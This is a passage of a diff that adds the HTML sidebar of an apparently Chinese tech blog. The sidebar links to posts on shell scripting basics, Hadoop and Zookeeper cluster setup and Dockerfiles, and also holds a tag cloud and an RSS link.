+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
